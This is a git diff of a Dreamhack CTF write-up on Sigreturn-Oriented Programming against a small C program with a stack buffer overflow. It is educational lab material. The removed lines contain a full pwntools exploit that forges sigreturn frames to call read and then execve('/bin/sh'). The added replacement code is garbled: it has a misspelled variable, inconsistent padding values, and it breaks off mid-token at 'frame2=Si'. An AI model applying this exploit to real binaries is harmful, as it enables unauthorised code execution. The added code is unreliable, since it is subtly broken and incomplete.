@@ -1,18 +1,15 @@
 ---
-title: "[Dreamhack] srop - Sigreturn-Oriented Programming"
+title: "[Dreamhack] srop - Write up"
 date: 2024-01-15 00:00:00 +0700
 categories: [Dreamhack, Binary Exploitation]
 tags: [pwn, srop, sigreturn, rop, nx, syscall, dreamhack]
 author: datious
-description: "Dreamhack writeup: srop — Sigreturn-Oriented Programming để thực thi execve('/bin/sh') khi không đủ gadgets cho ROP thông thường."
 ---
 
-# [Write up for Dreamhack] Challenge: srop
-**Author: datious**
+[Write up for dreamhack]__Challenge: srop | Author: datious
 
-## Source code
-
-```c
+srop.c
+```
 // Name: srop.c
 // Compile: gcc -o srop srop.c -fno-stack-protector -no-pie
 
@@ -21,103 +18,55 @@ description: "Dreamhack writeup: srop — Sigreturn-Oriented Programming để t
 int gadget() {
   asm("pop %rax;"
       "syscall;"
-      "ret");
+      "ret" );
 }
 
 int main()
 {
   char buf[16];
-  read(0, buf, 1024);   // ← Buffer Overflow
+  read(0, buf ,1024); //vuln
 }
-```
-
-The vulnerability is a **buffer overflow**. This allows hijacking program control flow.
-
-## 1. Analyze and Gather Ingredients
-
-**Security layers:**
-
-![Checksec](https://hackmd.io/_uploads/rkqYSlDHGg.png)
-
-→ **NX is enabled** — shellcode on stack won't execute.
-
-**Key gadget found:**
 
 ```
-0x00000000004004eb : pop rax ; syscall
+
+The vulnerability in this program is a buffer overflow. This allows us hijack program's control flow.
+
+#1. Analyze and Gather ingredients for exploitation
+    - First, I check the protection layers of the program.
+    ![image](https://hackmd.io/_uploads/rkqYSlDHGg.png)
+    - As you can see, NX is enabled, so we can't execute shellcode on the stack.
+    - Next, I checked whether useful gadgets exist in this program. 
+    - I found a very interesting gadget. 
+    
+    
+    ```
+    0x00000000004004eb : pop rax ; syscall
+    ```
+    
+- My idea is to leverage rt_sigreturn to write the **/bin/sh**   string into writable memory and execute **execve("/bin/sh")**.
+
+#2. Exploitation and Strategy (SROP)
+    2.1. Use rt_sigreturn to execute frame1(**read(0, rw_memory, len(stage2))**).(stage1)
+
 ```
+frame1=SigreturnFrame()
+frame1.rsp=rw
+frame1.rax=0
+frame1.rdi=0
+frame1.rsi=rw
+frame1.rdx=len(stage2)
+frame1.rip=syscall
+stage1=p64(1)
+stage1+=p64(2)
+syage1+=p64(15)
+stage1+=p64(pop_rax_syscall)
+stage1+=p64(15)
 
-**Strategy:** Leverage **SROP (Sigreturn-Oriented Programming)** to:
-1. Write `/bin/sh` string into writable memory
-2. Execute `execve("/bin/sh")`
-
-> **SROP key concept:** `rt_sigreturn` (syscall #15 on x86_64) restores CPU registers from a **sigreturn frame** on the stack. We craft a fake frame to set arbitrary register values.
-
-## 2. Exploitation Strategy
-
-### Stage 1: Use rt_sigreturn → call `read(0, rw_memory, len(stage2))`
-
-```python
-from pwn import *
-
-elf = ELF('./srop')
-p   = process('./srop')
-
-context.arch    = 'amd64'
-context.os      = 'linux'
-
-pop_rax_syscall = 0x00000000004004eb
-syscall         = pop_rax_syscall + 1      # just the syscall instruction
-
-# Writable memory (BSS or data segment)
-rw = elf.bss()
-
-frame1       = SigreturnFrame()
-frame1.rsp   = rw + 8           # new stack in writable memory
-frame1.rax   = 0                # syscall: read
-frame1.rdi   = 0                # fd: stdin
-frame1.rsi   = rw               # buf: writable memory
-frame1.rdx   = 200              # count
-frame1.rip   = syscall
-
-stage1  = b'A' * 24             # overflow buf (16) + saved rbp (8)
-stage1 += p64(pop_rax_syscall)
-stage1 += p64(15)               # RAX = 15 → rt_sigreturn
-stage1 += p64(syscall)          # trigger sigreturn
-stage1 += bytes(frame1)
-
-p.send(stage1)
+stage1+=bytes(frame1)
 ```
+2.2 Send the **"/bin/sh"** string and arrange frame2 into writable memory.
 
-### Stage 2: Send `/bin/sh` + frame2 → `execve("/bin/sh", 0, 0)`
-
-```python
-binsh = b'/bin/sh\x00'
-
-frame2       = SigreturnFrame()
-frame2.rax   = 59               # syscall: execve
-frame2.rdi   = rw               # ptr to "/bin/sh"
-frame2.rsi   = 0
-frame2.rdx   = 0
-frame2.rip   = syscall
-
-stage2  = binsh
-stage2  = stage2.ljust(8, b'\x00')
-stage2 += p64(pop_rax_syscall)
-stage2 += p64(15)
-stage2 += p64(syscall)
-stage2 += bytes(frame2)
-
-p.send(stage2)
-p.interactive()
 ```
+stage2=p64(pop_rax_syscall)+p64(15)
 
-## 3. Why SROP?
-
-| Technique | Requirement |
-|-----------|-------------|
-| ret2libc  | Leak + enough gadgets |
-| Shellcode | NX disabled |
-| **SROP**  | Only needs `pop rax; syscall` ✅ |
-
-SROP is extremely powerful when gadgets are scarce — only `pop rax; syscall` is required to completely control execution flow.
+frame2=Si
